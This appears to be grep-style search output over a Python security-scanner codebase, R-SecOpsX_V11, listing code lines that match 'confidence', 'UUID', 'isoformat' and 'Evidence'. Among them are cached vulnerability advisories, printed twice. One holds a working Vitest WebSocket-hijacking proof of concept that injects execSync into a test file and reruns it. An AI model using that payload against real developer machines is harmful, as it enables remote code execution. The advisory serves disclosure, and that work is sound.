+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\advanced_ai_security.py:529 | "confidence": "Contract",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\analysis_context.py:18 | 4. Confidence is never changed.
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:9 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:17 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:25 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:33 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:41 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:49 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:57 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:65 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:73 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:81 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:89 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:97 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:105 | "confidence": "MEDIUM",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\business_logic_patterns.py:113 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\iac_docker.py:247 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\iac_kubernetes.py:253 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\iac_terraform.py:282 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\idor_detector.py:211 | confidence: str   # "High" | "Medium"
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\idor_detector.py:408 | confidence="High",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\idor_detector.py:633 | "confidence": "Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\idor_detector.py:692 | "confidence": f.confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\idor_detector.py:934 | "confidence": "Medium",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_semantic_j4.py:159 | "confidence": "High",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_semantic_j5.py:159 | "confidence": "High",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\java_semantic_j5.py:1113 | "confidence": "High",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:450 | relevance = "LOW_CONTEXT_CONFIDENCE"
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:462 | relevance = "LOW_CONTEXT_CONFIDENCE"
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_context_precision.py:476 | relevance = "LOW_CONTEXT_CONFIDENCE"
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:686 | "Define escalation paths for uncertain, low-confidence, or policy-sensitive model outputs.",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:701 | "Require source citations and confidence checks before using retrieved content in answers or actions.",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:714 | "Block high-confidence responses when no trusted source supports the answer.",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:715 | "Return an explicit insufficient-evidence response when retrieval confidence is low.",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:721 | "Block high-confidence responses when no trusted source supports the answer.",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:722 | "Return an explicit insufficient-evidence response when retrieval confidence is low.",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:859 | "Display uncertainty and require human review for low-confidence outputs.",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:1153 | "confidence": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:1154 | "confidence_label": "HIGH",
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\llm_security.py:1155 | "confidence_score": 90,
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:227 | pkg["reachability_confidence"] = 0.85
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:228 | pkg["reachability_confidence_label"] = "MEDIUM"
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:238 | pkg["reachability_confidence"] = 0.65
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:239 | pkg["reachability_confidence_label"] = "MEDIUM"
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:250 | pkg["reachability_confidence"] = 0.30
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\reachability.py:251 | pkg["reachability_confidence_label"] = "LOW"
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:852 | confidence = "High" if sev == "Critical" else rule.get("confidence", "Medium")
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\sast.py:859 | "confidence": confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\secret_intelligence.py:120 | confidence = "Medium" if DECOY_WORDS.search(snippet) else "High"
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\secret_intelligence.py:121 | severity = "Medium" if confidence == "Medium" and sev == "Critical" else sev
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\secret_intelligence.py:128 | "confidence": confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:90 | confidence: str = "High"
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:256 | "priority": _priority(sev), "confidence": conf, "language": lang, "file": filepath, "line": line,
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:843 | "vuln_type": tf.vuln_type, "severity": sev, "priority": _priority(sev), "confidence": tf.confidence,
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:1016 | 'confidence': 'High',
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:1311 | 'confidence': 'High',
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\taint_engine.py:1451 | 'priority': _priority(severity), 'confidence': 'High', 'language': 'java',
+[confidence] D:\data\Code test\r-SecOpsX_V11\scanner\undeclared_dependency_intelligence.py:367 | "confidence": "HIGH" if len(occurrences) >= 1 else "LOW",
+[UUID] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:200 | fid = first_value(f, "finding_id", "id", "uuid")
+[UUID] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:278 | "finding_id": flatten_text(first_value(f, "finding_id", "id", "uuid")),
+[UUID] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_sast_fp_audit.py:187 | "finding_id": text(get(finding, "finding_id", "id", "uuid")),
+[UUID] D:\data\Code test\r-SecOpsX_V11\core\license_catalog.py:452 | "uuid": "MIT",
+[UUID] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:143 | 'UUID',
+[UUID] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:144 | 'uuid',
+[UUID] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:127 | 'UUID',
+[UUID] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:128 | 'uuid',
+[UUID] D:\data\Code test\r-SecOpsX_V11\reporting\cyclonedx_export.py:4 | import uuid
+[UUID] D:\data\Code test\r-SecOpsX_V11\reporting\cyclonedx_export.py:345 | "serialNumber": f"urn:uuid:{uuid.uuid4()}",
+[UUID] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:4 | import uuid
+[UUID] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:96 | "document": {"type": "R-SecOpsX VEX", "version": VEX_VERSION, "id": f"urn:uuid:{uuid.uuid4()}", "created": datetime.now(timezone.utc).isoformat(), "author": "R-SecOpsX", "profile": "RSECOpsX_VEX_REACHABILITY_KEV_EPSS_RELEASE_GATE"},
+[UUID] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:5179 | "npm|grunt-retire/node_modules/node-uuid|1.4.8": [],
+[UUID] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:6516 | "npm|npm/node_modules/request/node_modules/node-uuid|1.4.7": [],
+[UUID] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:7526 | "npm|uuid|3.3.2": [
+[UUID] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:7535 | "summary": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+[UUID] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:7536 | "details": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+[UUID] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:7733 | "npm|zaproxy/node_modules/node-uuid|1.4.8": [],
+[UUID] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:10781 | "details": "### Summary\nArbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.\n\n### Details\nWhen [`api` option](https://vitest.dev/config/#api) is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.\nhttps://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\n\nThis WebSocket server has `saveTestFile` API that can edit a test file and `rerun` API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the `saveTestFile` API and then running that file by calling the `rerun` API.\nhttps://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\n\n### PoC\n1. Open Vitest UI.\n2. Access a malicious web site with the script below.\n3. If you have `calc` executable in `PATH` env var (you'll likely have it if you are running on Windows), that application will be executed.\n\n```js\n// code from https://github.com/WebReflection/flatted\nconst Flatted=function(n){\"use strict\";function t(n){return t=\"function\"==typeof Symbol&&\"symbol\"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&\"function\"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?\"symbol\":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f=\"string\",i={},c=\"object\",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p<y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&&(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g<m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&&u?y(o,new Set,u,f):u;return f.call({\"\":i},\"\",i)},S=function(n,r,o){for(var u=r&&t(r)===c?function(n,t){return\"\"===n||-1<r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({\"\":n},\"\",n)),v=!y;y<l.length;)v=!0,s[y]=e(l[y++],S,o);return\"[\"+s.join(\",\")+\"]\";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});\n\n// actual code to run\nconst ws = new WebSocket('ws://localhost:51204/__vitest_api__')\nws.addEventListener('message', e => {\n    console.log(e.data)\n})\nws.addEventListener('open', () => {\n    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: \"getFiles\", a: [] }))\n\n    const testFilePath = \"/path/to/test-file/basic.test.ts\" // use a test file returned from the response of \"getFiles\"\n\n    // edit file content to inject command execution\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"saveTestFile\",\n      a: [testFilePath, \"import child_process from 'child_process';child_process.execSync('calc')\"]\n    }))\n    // rerun the tests to run the injected command execution code\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"rerun\",\n      a: [testFilePath]\n    }))\n})\n```\n\n### Impact\nThis vulnerability can result in remote code execution for users that are using Vitest serve API.",
+[UUID] D:\data\Code test\r-SecOpsX_V11\scanner\idor_detector.py:597 | "Use UUIDs instead of sequential IDs.",
+[UUID] D:\data\Code test\r-SecOpsX_V11\scanner\undeclared_dependency_intelligence.py:50 | "traceback", "types", "typing", "unittest", "urllib", "uuid",
+[uuid] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:200 | fid = first_value(f, "finding_id", "id", "uuid")
+[uuid] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_fp_audit.py:278 | "finding_id": flatten_text(first_value(f, "finding_id", "id", "uuid")),
+[uuid] D:\data\Code test\r-SecOpsX_V11\analysis\juice_shop_sast_fp_audit.py:187 | "finding_id": text(get(finding, "finding_id", "id", "uuid")),
+[uuid] D:\data\Code test\r-SecOpsX_V11\core\license_catalog.py:452 | "uuid": "MIT",
+[uuid] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:143 | 'UUID',
+[uuid] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:144 | 'uuid',
+[uuid] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:127 | 'UUID',
+[uuid] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:128 | 'uuid',
+[uuid] D:\data\Code test\r-SecOpsX_V11\reporting\cyclonedx_export.py:4 | import uuid
+[uuid] D:\data\Code test\r-SecOpsX_V11\reporting\cyclonedx_export.py:345 | "serialNumber": f"urn:uuid:{uuid.uuid4()}",
+[uuid] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:4 | import uuid
+[uuid] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:96 | "document": {"type": "R-SecOpsX VEX", "version": VEX_VERSION, "id": f"urn:uuid:{uuid.uuid4()}", "created": datetime.now(timezone.utc).isoformat(), "author": "R-SecOpsX", "profile": "RSECOpsX_VEX_REACHABILITY_KEV_EPSS_RELEASE_GATE"},
+[uuid] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:5179 | "npm|grunt-retire/node_modules/node-uuid|1.4.8": [],
+[uuid] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:6516 | "npm|npm/node_modules/request/node_modules/node-uuid|1.4.7": [],
+[uuid] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:7526 | "npm|uuid|3.3.2": [
+[uuid] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:7535 | "summary": "uuid: Missing buffer bounds check in v3/v5/v6 when buf is provided",
+[uuid] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:7536 | "details": "### Summary\n\nThe `v3()`, `v5()`, and `v6()` [API methods](https://github.com/uuidjs/uuid#api-summary) (not `uuid` release versions) accept external output buffers but do not reject out-of-range writes (small `buf` or large `offset`).  \nBy contrast, `v4()`, `v1()`, and `v7()` API methods explicitly throw `RangeError` on invalid bounds.\n\nThis inconsistency allows **silent partial writes** into caller-provided buffers.\n\n\n### Affected code\n\n- `src/v35.ts` (`v3()`/`v5()` path) writes `buf[offset + i]` without bounds validation.\n- `src/v6.ts` writes `buf[offset + i]` without bounds validation.\n\n### Reproducible PoC\n\n```bash\ncd /home/StrawHat/uuid\nnpm ci\nnpm run build\n\nnode --input-type=module -e \"\nimport {v4,v5,v6} from './dist-node/index.js';\nconst ns='6ba7b810-9dad-11d1-80b4-00c04fd430c8';\nfor (const [name,fn] of [\n  ['v4()',()=>v4({},new Uint8Array(8),4)],\n  ['v5()',()=>v5('x',ns,new Uint8Array(8),4)],\n  ['v6()',()=>v6({},new Uint8Array(8),4)],\n]) {\n  try { fn(); console.log(name,'NO_THROW'); }\n  catch(e){ console.log(name,'THREW',e.name); }\n}\"\n```\n\nObserved:\n\n- `v4() THREW RangeError`\n- `v5() NO_THROW`\n- `v6() NO_THROW`\n\nExample partial overwrite evidence captured during audit:\n\n```text\nsame true buf [\n  170, 170, 170, 170,\n   75, 224, 100,  63\n]\nv6 [\n  187, 187, 187, 187,\n   31,  19, 185,  64\n]\n```\n\n### Security impact\n\n- **Primary**: integrity/robustness issue (silent partial output).\n- If an application assumes full UUID writes into preallocated buffers, this can produce malformed/truncated/partially stale identifiers without error.\n- In systems where caller-controlled offsets/buffer sizes are exposed indirectly, this may become a security-relevant logic flaw.\n\n### Suggested fix\n\nAdd the same guard used by `v4()`/`v1()`/`v7()`:\n\n```ts\nif (offset < 0 || offset + 16 > buf.length) {\n  throw new RangeError(`UUID byte range ${offset}:${offset + 15} is out of buffer bounds`);\n}\n```\n\nApply to:\n\n- `src/v35.ts` (covers `v3()` and `v5()`)\n- `src/v6.ts`",
+[uuid] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:7733 | "npm|zaproxy/node_modules/node-uuid|1.4.8": [],
+[uuid] D:\data\Code test\r-SecOpsX_V11\reports\.vuln_cache.json:10781 | "details": "### Summary\nArbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.\n\n### Details\nWhen [`api` option](https://vitest.dev/config/#api) is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.\nhttps://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\n\nThis WebSocket server has `saveTestFile` API that can edit a test file and `rerun` API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the `saveTestFile` API and then running that file by calling the `rerun` API.\nhttps://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\n\n### PoC\n1. Open Vitest UI.\n2. Access a malicious web site with the script below.\n3. If you have `calc` executable in `PATH` env var (you'll likely have it if you are running on Windows), that application will be executed.\n\n```js\n// code from https://github.com/WebReflection/flatted\nconst Flatted=function(n){\"use strict\";function t(n){return t=\"function\"==typeof Symbol&&\"symbol\"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&\"function\"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?\"symbol\":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f=\"string\",i={},c=\"object\",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p<y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&&(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g<m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&&u?y(o,new Set,u,f):u;return f.call({\"\":i},\"\",i)},S=function(n,r,o){for(var u=r&&t(r)===c?function(n,t){return\"\"===n||-1<r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({\"\":n},\"\",n)),v=!y;y<l.length;)v=!0,s[y]=e(l[y++],S,o);return\"[\"+s.join(\",\")+\"]\";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});\n\n// actual code to run\nconst ws = new WebSocket('ws://localhost:51204/__vitest_api__')\nws.addEventListener('message', e => {\n    console.log(e.data)\n})\nws.addEventListener('open', () => {\n    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: \"getFiles\", a: [] }))\n\n    const testFilePath = \"/path/to/test-file/basic.test.ts\" // use a test file returned from the response of \"getFiles\"\n\n    // edit file content to inject command execution\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"saveTestFile\",\n      a: [testFilePath, \"import child_process from 'child_process';child_process.execSync('calc')\"]\n    }))\n    // rerun the tests to run the injected command execution code\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"rerun\",\n      a: [testFilePath]\n    }))\n})\n```\n\n### Impact\nThis vulnerability can result in remote code execution for users that are using Vitest serve API.",
+[uuid] D:\data\Code test\r-SecOpsX_V11\scanner\idor_detector.py:597 | "Use UUIDs instead of sequential IDs.",
+[uuid] D:\data\Code test\r-SecOpsX_V11\scanner\undeclared_dependency_intelligence.py:50 | "traceback", "types", "typing", "unittest", "urllib", "uuid",
+[ISO-8601] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:145 | 'ISO-8601',
+[ISO-8601] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Evidence_Schema_Discovery_Gate.ps1:129 | 'ISO-8601',
+[isoformat] D:\data\Code test\r-SecOpsX_V11\analysis\external_baseline_comparator.py:124 | "generated_at": datetime.now(timezone.utc).isoformat(),
+[isoformat] D:\data\Code test\r-SecOpsX_V11\analysis\supply_chain_trust_engine.py:105 | dt = datetime.fromisoformat(text)
+[isoformat] D:\data\Code test\r-SecOpsX_V11\analysis\vulnerability_age_engine.py:27 | dt = datetime.fromisoformat(str(value).replace("Z", "+00:00"))
+[isoformat] D:\data\Code test\r-SecOpsX_V11\analysis\vulnerability_age_engine.py:157 | item["age_as_of"] = now.date().isoformat()
+[isoformat] D:\data\Code test\r-SecOpsX_V11\analysis\vulnerability_age_engine.py:219 | item["age_as_of"] = now.date().isoformat()
+[isoformat] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:596 | f["detected_at"] = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
+[isoformat] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:721 | pkg["detected_at"] = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
+[isoformat] D:\data\Code test\r-SecOpsX_V11\core\analyzer.py:1091 | "scan_date":             datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
+[isoformat] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:260 | f["detected_at"] = datetime.utcnow().isoformat() + "Z"
+[isoformat] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:332 | pkg["detected_at"] = datetime.utcnow().isoformat() + "Z"
+[isoformat] D:\data\Code test\r-SecOpsX_V11\core\idor analyzer.py:486 | "scan_date":             datetime.utcnow().isoformat() + "Z",
+[isoformat] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:277 | f["detected_at"] = datetime.utcnow().isoformat() + "Z"
+[isoformat] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:359 | pkg["detected_at"] = datetime.utcnow().isoformat() + "Z"
+[isoformat] D:\data\Code test\r-SecOpsX_V11\core\idoranalyzer.py:516 | "scan_date":             datetime.utcnow().isoformat() + "Z",
+[isoformat] D:\data\Code test\r-SecOpsX_V11\dump\R-SecOpsX_V11_Corrected_Test_Discovery.ps1:146 | 'isoformat',
+[isoformat] D:\data\Code test\r-SecOpsX_V11\reporting\cyclonedx_export.py:348 | "timestamp": datetime.now(timezone.utc).isoformat(),
+[isoformat] D:\data\Code test\r-SecOpsX_V11\reporting\cyclonedx_export.py:379 | "value": datetime.now(timezone.utc).date().isoformat(),
+[isoformat] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:79 | "timestamp": datetime.now(timezone.utc).isoformat(),
+[isoformat] D:\data\Code test\r-SecOpsX_V11\reporting\vex_export.py:96 | "document": {"type": "R-SecOpsX VEX", "version": VEX_VERSION, "id": f"urn:uuid:{uuid.uuid4()}", "created": datetime.now(timezone.utc).isoformat(), "author": "R-SecOpsX", "profile": "RSECOpsX_VEX_REACHABILITY_KEV_EPSS_RELEASE_GATE"},
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:73 | from analysis.license_evidence_resolver import enrich_license_evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:721 | finding.get("snippet") or finding.get("evidence"),
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:943 | # cross-file evidence to point to the wrong source file.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:989 | """Remove grouped occurrences whose own evidence does not support the finding.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:992 | taint path/detection metadata so a validated occurrence cannot lend evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:1023 | # Require occurrence-local source-to-sink evidence. Configured
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:1086 | # No occurrence satisfied its own evidence contract. Do not retain
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:1140 | or evidence from pre-pruned grouped detections.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:1154 | snippet = str(occ.get("snippet") or occ.get("evidence") or "")
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:1198 | # Rebuild evidence ONLY from retained occurrences.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:1199 | evidence = []
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:1201 | for key in ("evidence", "snippet", "taint_path", "detection"):
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:1206 | if text and text not in evidence:
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:1207 | evidence.append(text)
+[Evidence] D:\data\Code test\r-SecOpsX_V11\main.py:1208 | finding["evidence"] = evidence
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\ai_model_risk_engine.py:86 | "evidence_match": name,
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\ai_model_risk_engine.py:190 | # executive/release-gating evidence.
+[Evidence] D:\data\Code test\r-SecOpsX_V11\analysis\ai_model_risk_engine.py:223 | item["scope"] = "EVIDENCE_ITEM"
